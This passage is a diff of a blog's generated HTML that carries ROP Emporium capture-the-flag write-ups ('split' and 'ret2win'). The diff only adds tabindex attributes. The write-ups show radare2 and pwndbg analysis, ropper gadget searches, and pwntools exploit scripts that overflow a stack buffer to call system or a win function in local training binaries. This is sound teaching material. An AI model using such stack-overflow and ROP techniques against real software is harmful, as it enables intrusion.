 &lt;p>lets check the binary&amp;rsquo;s mitigation and from the previous challenge we know we need 40 bytes to overflow .&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ checksec split
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ checksec split
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/1-split/split64/split&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -327,7 +327,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>This looks similar to ret2win and we see nx is enabled so we cant use shellcode to spawn a shell.
 So for this challenge the two elements that we need are a &lt;code>/bin/cat flag.txt&lt;/code> and call to &lt;code>system() function&lt;/code>&lt;/p>
 &lt;p>Let&amp;rsquo;s check out the if the cat flag string is present in the binary&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ rabin2 -z split
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ rabin2 -z split
 &lt;span style="color:#f92672">[&lt;/span>Strings&lt;span style="color:#f92672">]&lt;/span>
 nth paddr vaddr len size section type string
 ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
@@ -341,7 +341,7 @@ nth paddr vaddr len size section type string
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Yes we can see our cat flag string present,
 the addr of our cat flag string is &lt;code>0x00601060&lt;/code>&lt;/p>
 &lt;p>Next up we need our system function lets look at some funcitons using radare2.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; afl
 0x004005b0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> entry0
 0x004005f0 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">42&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">37&lt;/span> sym.deregister_tm_clones
 0x00400620 &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> -&amp;gt; &lt;span style="color:#ae81ff">55&lt;/span> sym.register_tm_clones
@@ -362,7 +362,7 @@ the addr of our cat flag string is &lt;code>0x00601060&lt;/code>&lt;/p>
 0x004005a0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
 0x00400528 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Everything seems normal but we can see there&amp;rsquo;s a useful function lets take a look at it&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s sym.usefulFunction
 &lt;span style="color:#f92672">[&lt;/span>0x00400742&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ┌ 17: sym.usefulFunction &lt;span style="color:#f92672">()&lt;/span>;
 │ 0x00400742 push rbp
@@ -377,7 +377,7 @@ let&amp;rsquo;s take a note at the address of it &lt;code>0x0040074b&lt;/code>.
 Great we&amp;rsquo;ve found the two elements now we just need to find the right gadget.
 But what gadget are we looking for, we&amp;rsquo;re looking for a pop rdi gadget so we can store the string into rdi register and call system so we can cat out flag .&lt;/p>
 &lt;p>Now we&amp;rsquo;ll use ropper to find the gagdget.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 split64 ➤ ropper --file split --search &lt;span style="color:#e6db74">&amp;#34;pop rdi&amp;#34;&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>INFO&lt;span style="color:#f92672">]&lt;/span> Load gadgets from cache
 &lt;span style="color:#f92672">[&lt;/span>LOAD&lt;span style="color:#f92672">]&lt;/span> loading... 100%
@@ -387,11 +387,11 @@ split64 ➤ ropper --file split --search &lt;span style="color:#e6db74">&amp;#34
 0x00000000004007c3: pop rdi; ret;
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploitation">Exploitation&lt;/h2>
 &lt;p>Combining what we&amp;rsquo;re gonna do.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#ae81ff">40&lt;/span> bytes to overflow
 gadget
 cat_flag string
 call_system by returning into it
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 io &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#34;./split&amp;#34;&lt;/span>)
 padding &lt;span style="color:#f92672">=&lt;/span> cyclic(&lt;span style="color:#ae81ff">40&lt;/span>) &lt;span style="color:#75715e"># 40 bytes to overflow&lt;/span>
@@ -403,7 +403,7 @@ payload &lt;span style="color:#f92672">+=&lt;/span> gadget &lt;span style="color
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s run the exploit to check if it works&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ python xpl.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">split64 ➤ python xpl.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;./split&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">15817&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Switching to interactive mode
 split by ROP Emporium
@@ -418,7 +418,7 @@ In this technique, an attacker gains control of the call stack to hijack program
 &lt;p>Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing.&lt;/p>
 &lt;p>In this technique, an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&amp;rsquo;s memory, called &amp;ldquo;gadgets&amp;rdquo;. Each gadget typically ends in a return instruction and is located in a subroutine within the existing program and/or shared library code. Chained together, these gadgets allow an attacker to perform arbitrary operations on a machine employing defenses that thwart simpler attacks.&lt;/p>
 &lt;h2 id="the-tools-i-use">The tools i use&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">pwntools
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">pwntools
 pwndbg&lt;span style="color:#f92672">/&lt;/span>gef
 ropper&lt;span style="color:#f92672">/&lt;/span>ROPgadget
 radare2
@@ -458,7 +458,7 @@ check this article
 &lt;img src="https://ctf101.org/binary-exploitation/what-is-binary-security/" alt="binary-mitigation">&lt;/p>
 &lt;h2 id="exploitation">Exploitation&lt;/h2>
 &lt;p>Now lets checkout the functions and disassembly using radare2&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ r2 -AAA ret2win
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ r2 -AAA ret2win
 &lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze all flags starting with sym. and entry0 &lt;span style="color:#f92672">(&lt;/span>aa&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze &lt;span style="color:#66d9ef">function&lt;/span> calls &lt;span style="color:#f92672">(&lt;/span>aac&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">[&lt;/span>x&lt;span style="color:#f92672">]&lt;/span> Analyze len bytes of instructions &lt;span style="color:#66d9ef">for&lt;/span> references &lt;span style="color:#f92672">(&lt;/span>aar&lt;span style="color:#f92672">)&lt;/span>
@@ -490,7 +490,7 @@ check this article
 0x004005a0 &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> sym.imp.setvbuf
 0x00400528 &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> sym._init
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets take a look at he main function to see what happens in there&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s main
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x004005b0&lt;span style="color:#f92672">]&lt;/span>&amp;gt; s main
 &lt;span style="color:#f92672">[&lt;/span>0x00400697&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ; DATA XREF from entry0 @ 0x4005cd
 ┌ 81: int main &lt;span style="color:#f92672">(&lt;/span>int argc, char **argv, char **envp&lt;span style="color:#f92672">)&lt;/span>;
@@ -517,7 +517,7 @@ check this article
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The main function just prints the output we saw when we ran the binary and its calls a function named pwnme
 we know the pwnme function contains the vulnerable gets fucntions which we need to overflow&lt;/p>
 &lt;p>let&amp;rsquo;s checkout ret2win fucntion to see what it does&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400756&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">[&lt;/span>0x00400756&lt;span style="color:#f92672">]&lt;/span>&amp;gt; pdf
 ┌ 27: sym.ret2win &lt;span style="color:#f92672">()&lt;/span>;
 │ 0x00400756 &lt;span style="color:#ae81ff">55&lt;/span> push rbp
 │ 0x00400757 4889e5 mov rbp, rsp
@@ -544,7 +544,7 @@ You there, may I have your input please? And don't worry about null bytes, we're
 Thank you!
 [1] 34640 segmentation fault (core dumped) ./ret2win
 &lt;/code>&lt;/pre>&lt;p>Now on passing the pattern we get a segfault let&amp;rsquo;s do the same with pwndbg&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ pwndbg ./ret2win
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ pwndbg ./ret2win
 pwndbg: loaded &lt;span style="color:#ae81ff">193&lt;/span> commands. Type pwndbg &lt;span style="color:#f92672">[&lt;/span>filter&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> a list.
 pwndbg: created $rebase, $ida gdb functions &lt;span style="color:#f92672">(&lt;/span>can be used with print/break&lt;span style="color:#f92672">)&lt;/span>
 Reading symbols from ./ret2win...
@@ -602,12 +602,12 @@ pwndbg&amp;gt; x/wx $rsp
 0x7fffffffe8b8: 0x6161616b
 pwndbg&amp;gt; q
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets find out the offset to overwrite the RIP&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">In &lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span>: from pwn import *
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">In &lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">]&lt;/span>: from pwn import *
 In &lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>: cyclic_find&lt;span style="color:#f92672">(&lt;/span>0x6161616b&lt;span style="color:#f92672">)&lt;/span>
 Out&lt;span style="color:#f92672">[&lt;/span>2&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#ae81ff">40&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we know the offset is 40 let&amp;rsquo;s craft our exploit but we notice there&amp;rsquo;s actually a hint give the webpage saying&lt;/p>
 &lt;pre>&lt;code>It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the 64bit binaries, 44 bytes in the 32bit binaries
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3 &lt;/span>
+&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3 &lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
@@ -617,7 +617,7 @@ payload &lt;span style="color:#f92672">=&lt;/span> flat([cyclic(&lt;span style="
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>so now we run the exploit to check if it works :)&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ ./exploit
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ret2win64 ➤ ./exploit
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Documents/pwn/rop_emporium/0-ret2win/ret2win64/ret2win&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
